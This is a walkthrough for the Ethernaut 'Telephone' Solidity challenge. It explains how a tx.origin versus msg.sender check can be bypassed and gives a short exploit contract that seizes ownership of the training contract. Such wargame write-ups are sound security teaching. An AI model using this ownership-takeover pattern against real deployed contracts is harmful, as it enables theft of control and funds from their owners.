---
description: >-
  In Ethernaut's Telephone, we learn the difference between tx.origin and
  msg.sender.
---

# 4 - Telephone

The goal of [this level](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768) is to become the contract's owner.

### Hints

<details>

<summary>Hint One</summary>

The solution to this level is to call the contract's `changeOwner` function with a transaction that has a different `tx.origin` and `msg.sender`. The `tx.origin` will always be the originating wallet making the transaction, but `msg.sender` can be a contract address.

</details>

### Full Walkthrough

The solution to this level is straightforward. The contract's `changeOwner` function only requires that `tx.origin` is not equal to `msg.sender`.

```solidity
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

In Solidity, `msg.sender` always provides the _direct_ sender of the transaction. This could be, for example, a contract that the user called which in turn called another contract. The `tx.origin` is always the **origin** of the transaction, the externally owned address it was originally sent from.

We can solve this level by crafting an exploit contract that forwards our transaction. The exploit contract's address becomes the `msg.sender`, while our player wallet address remains the `tx.origin`.

### Scripted Solution

```solidity
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneExploit {
    Telephone public telephoneContract;

    /**
     * @dev Sets `telephoneContract` to instance at `telephoneContractAddress`.
     */
    constructor(address telephoneContractAddress) {
        telephoneContract = Telephone(telephoneContractAddress);
    }

    /**
     * @dev Sets `telephoneContract` owner to calling wallet address.
     */
    function changeTelephoneContractOwner() public {
        telephoneContract.changeOwner(tx.origin);
    }
}
```

### Key Takeaways

* The difference between **tx.origin** and **msg.sender** in Solidity contracts.
